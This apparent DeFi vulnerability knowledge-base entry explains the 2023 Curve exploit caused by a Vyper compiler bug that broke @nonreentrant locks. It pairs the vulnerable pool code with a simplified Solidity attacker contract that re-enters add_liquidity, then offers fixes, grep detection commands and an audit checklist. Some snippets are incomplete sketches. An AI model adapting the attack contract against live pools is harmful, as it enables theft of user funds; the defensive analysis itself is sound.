---
protocol: curve
chain: ethereum
category: compiler_bug
vulnerability_type: vyper_reentrancy_lock_bug

attack_type: reentrancy
affected_component: vyper_compiler

primitives:
  - compiler_bug
  - reentrancy_lock
  - vyper_compiler
  - nonreentrant_bypass
  - bytecode_generation
  - storage_slot_collision

severity: critical
impact: fund_loss
exploitability: 0.6
financial_impact: critical

tags:
  - compiler
  - vyper
  - reentrancy_lock
  - nonreentrant
  - bytecode
  - curve
  - optimization_bug
  - real_exploit
  - DeFiHackLabs

source: DeFiHackLabs
total_exploits_analyzed: 1
total_losses: "$41.0M"
---

## Compiler-Level Vulnerability Patterns

### Overview

Compiler-level vulnerabilities occur when bugs in the compiler itself generate incorrect bytecode from correct source code. These are uniquely dangerous because auditors reviewing source code **cannot detect the vulnerability** — the source is correct; only the compiled output is wrong. The most devastating example is the Vyper compiler's `@nonreentrant` bug, which silently disabled reentrancy locks in Curve pools compiled with Vyper 0.2.15–0.3.0, enabling a $41M exploit.

### Vulnerability Description

#### Root Cause

The Vyper compiler versions 0.2.15, 0.2.16, and 0.3.0 had a bug in the code generation for the `@nonreentrant` decorator. The reentrancy lock used a storage slot that could be improperly handled across cross-function reentrancy scenarios:

1. **Storage Slot Misalignment**: The `@nonreentrant` decorator in affected versions generated lock/unlock code that used inconsistent storage slots for different functions sharing the same lock key. This meant a reentrancy guard set by function A didn't properly block function B.

2. **Cross-Function Reentrancy**: Function `remove_liquidity()` sends ETH (triggering the attacker's `receive()`), but the lock set by `remove_liquidity` doesn't prevent calling `add_liquidity()` from within the callback — because the compiled bytecode checks different storage slots.

3. **Source Code Looks Correct**: Both functions have `@nonreentrant("lock")` in the Vyper source. The bug is invisible at source level and only exists in compiled bytecode.

#### Attack Scenario

1. Attacker calls `remove_liquidity()` on the Curve pool (compiled with vulnerable Vyper)
2. Pool sends ETH to the attacker before updating state (standard ETH transfer)
3. Attacker's `receive()` function calls `add_liquidity()` on the same pool
4. The reentrancy lock SHOULD block this — but due to the compiler bug, it doesn't
5. `add_liquidity()` executes with stale state (pre-removal reserves), minting excess LP tokens
6. Both calls complete — attacker holds more LP tokens than they should
7. Attacker redeems excess LP tokens for profit

---

### Vulnerable Pattern Examples

#### Category 1: Vyper @nonreentrant Lock Bypass [CRITICAL]

**Example 1: Curve Finance — Vyper Compiler Reentrancy Lock Bug (2023-07, ~$41M)** [CRITICAL]
```python
# ❌ VULNERABLE: Vyper source is CORRECT, but compiled bytecode is BROKEN
# Curve pool contract (pETH/ETH pool) — Vyper 0.2.15

@nonreentrant("lock")
@external
def add_liquidity(amounts: uint256[N_COINS], min_mint_amount: uint256) -> uint256:
    # @audit This function should be protected by "lock"
    # @audit In compiled bytecode: checks WRONG storage slot for the lock
    ...
    self._mint(msg.sender, mint_amount)
    return mint_amount

@nonreentrant("lock")
@external
def remove_liquidity(_amount: uint256, min_amounts: uint256[N_COINS]) -> uint256[N_COINS]:
    # @audit This function also protected by "lock" — same key
    # @audit Sends raw ETH BEFORE updating state
    amounts: uint256[N_COINS] = empty(uint256[N_COINS])
    for i in range(N_COINS):
        value: uint256 = self.balances[i] * _amount / total_supply
        amounts[i] = value
        if i == 0:
            # @audit ETH sent here — triggers attacker's receive()
            raw_call(msg.sender, b"", value=value)
        else:
            ERC20(self.coins[i]).transfer(msg.sender, value)
    # @audit State update happens AFTER ETH transfer
    # @audit With working reentrancy lock, ok. With broken lock, exploitable.
    self.totalSupply -= _amount
    return amounts
```

```solidity
// Attacker contract (Solidity) from DeFiHackLabs PoC:
interface ICurvePool {
    function add_liquidity(uint256[2] calldata amounts, uint256 min_mint_amount)
        external payable returns (uint256);
    function remove_liquidity(uint256 _amount, uint256[2] calldata min_amounts)
        external returns (uint256[2] memory);
}

contract CurveExploit {
    ICurvePool public pool;
    bool public reentered;

    function attack() external payable {
        // Step 1: Add initial liquidity
        pool.add_liquidity{value: msg.value}([msg.value, 0], 0);

        // Step 2: Remove liquidity — triggers ETH send → receive()
        uint256 lpBalance = IERC20(address(pool)).balanceOf(address(this));
        pool.remove_liquidity(lpBalance, [uint256(0), 0]);
    }

    receive() external payable {
        if (!reentered) {
            reentered = true;
            // @audit Step 3: REENTRANCY into add_liquidity()
            // @audit Should be blocked by @nonreentrant("lock")
            // @audit But Vyper 0.2.15 compiled code has broken lock!
            pool.add_liquidity{value: msg.value}([msg.value, 0], 0);
            // @audit add_liquidity uses stale state (pre-removal balances)
            // @audit Mints MORE LP tokens than deserved
        }
    }

    function withdraw() external {
        // Step 4: Remove all LP tokens at correct post-attack prices
        uint256 lpBalance = IERC20(address(pool)).balanceOf(address(this));
        pool.remove_liquidity(lpBalance, [uint256(0), 0]);
        // Profit: excess LP tokens from stale-state minting
    }
}
```
- **PoC**: `DeFiHackLabs/src/test/2023-07/Curve_exp01.sol`
- **Attack TX**: https://etherscan.io/tx/0xa84aa065ce61dbb1eb50ab6ae67fc31a9da50dd2c74eefd561661bfce2f1620c
- **Root Cause**: Vyper compiler 0.2.15–0.3.0 generated incorrect bytecode for `@nonreentrant("lock")`. The storage slot used for the lock in `remove_liquidity()` didn't match the slot checked in `add_liquidity()`, allowing cross-function reentrancy.

---

### Impact Analysis

#### Technical Impact
- **Invisible Vulnerability**: Source code audits cannot detect compiler bugs — the Vyper source is correct
- **Cross-Function Reentrancy**: The lock that should prevent A→B reentrancy silently fails
- **Stale State Exploitation**: Reentering during state transition allows minting at pre-update prices
- **All Pools Affected**: Every pool compiled with Vyper 0.2.15–0.3.0 using `@nonreentrant` was at risk

#### Business Impact
- **Scale**: $41M lost from Curve pools (largest compiler-bug exploit in DeFi history)
- **Affected Pools**: pETH/ETH, msETH/ETH, alETH/ETH pools on Curve
- **Ecosystem Impact**: Market-wide panic; CRV token price dropped significantly
- **Time to Discovery**: The Vyper bug was present for ~2 years before exploitation

---

### Secure Implementation

**Fix 1: Use Verified Compiler Versions**
```python
# ✅ SECURE: Use Vyper >= 0.3.1 where the @nonreentrant bug is fixed
# @version 0.3.7

@nonreentrant("lock")
@external
def add_liquidity(amounts: uint256[N_COINS], min_mint_amount: uint256) -> uint256:
    # In Vyper >= 0.3.1, the storage slot for "lock" is consistent
    # across all functions sharing the same nonreentrant key
    ...
```

**Fix 2: Add Explicit Solidity-Style Reentrancy Guard**
```python
# ✅ SECURE: Manual reentrancy guard as defense-in-depth
_reentrancy_lock: bool

@internal
def _lock():
    assert not self._reentrancy_lock, "reentrant call"
    self._reentrancy_lock = True

@internal
def _unlock():
    self._reentrancy_lock = False

@external
def add_liquidity(amounts: uint256[N_COINS], min_mint_amount: uint256) -> uint256:
    self._lock()
    # ... function body ...
    self._unlock()
    return mint_amount
```

**Fix 3: Check-Effects-Interactions Even With Reentrancy Lock**
```python
# ✅ SECURE: Update state BEFORE sending ETH (belt + suspenders)
@nonreentrant("lock")
@external
def remove_liquidity(_amount: uint256, min_amounts: uint256[N_COINS]) -> uint256[N_COINS]:
    # @audit Update state FIRST (checks-effects-interactions pattern)
    self.totalSupply -= _amount
    amounts: uint256[N_COINS] = empty(uint256[N_COINS])
    for i in range(N_COINS):
        amounts[i] = self.balances[i] * _amount / old_supply
        self.balances[i] -= amounts[i]

    # @audit Send ETH AFTER state is updated
    # Even if reentrancy lock fails, attacker sees updated state
    for i in range(N_COINS):
        if i == 0:
            raw_call(msg.sender, b"", value=amounts[i])
        else:
            ERC20(self.coins[i]).transfer(msg.sender, amounts[i])
    return amounts
```

---

### Detection Patterns

```bash
# Identify Vyper compiler version in use
grep -rn "@version\|# @version" --include="*.vy"

# Check for affected Vyper versions (0.2.15, 0.2.16, 0.3.0)
grep -rn "0\.2\.15\|0\.2\.16\|0\.3\.0" --include="*.vy" --include="*.json"

# Check for @nonreentrant in Vyper contracts
grep -rn "@nonreentrant" --include="*.vy"

# Check for raw ETH transfers before state updates in Vyper
grep -B5 -A5 "raw_call.*value=" --include="*.vy" | grep "self\."

# Verify bytecode matches expected compilation
# Compare deployed bytecode against locally compiled version
```

---

### Audit Checklist

1. **What Vyper version compiled this contract?** — Versions 0.2.15, 0.2.16, 0.3.0 have the @nonreentrant bug
2. **Does the contract use @nonreentrant?** — If yes AND vulnerable Vyper version, the lock may be broken
3. **Does any function send raw ETH before updating state?** — Even with reentrancy lock, apply CEI pattern
4. **Is the deployed bytecode verified against source?** — Compile locally and compare to on-chain bytecode
5. **Are there cross-function reentrancy scenarios?** — Test A→B reentrancy where A sends ETH and B reads state
6. **Is defense-in-depth applied?** — Don't rely solely on compiler features for security

---

### Real-World Examples

| Protocol | Date | Loss | Attack Vector | Chain |
|----------|------|------|---------------|-------|
| Curve (pETH/ETH) | 2023-07 | $41.0M | Vyper 0.2.15 @nonreentrant bug → cross-function reentrancy | Ethereum |

---

### DeFiHackLabs PoC References

- **Curve** (2023-07, $41.0M): `DeFiHackLabs/src/test/2023-07/Curve_exp01.sol`

---

### Keywords

- compiler_bug
- vyper
- nonreentrant
- reentrancy_lock
- storage_slot
- bytecode
- cross_function_reentrancy
- curve
- vyper_0_2_15
- source_audit_bypass
- DeFiHackLabs

---

### Related Vulnerabilities

- [Reentrancy Patterns](../../general/reentrancy/) — Standard reentrancy vulnerabilities
- [Proxy Vulnerabilities](../../general/proxy-vulnerabilities/) — Storage slot collision patterns
- [Storage Collision](../../general/storage-collision/) — Storage layout issues
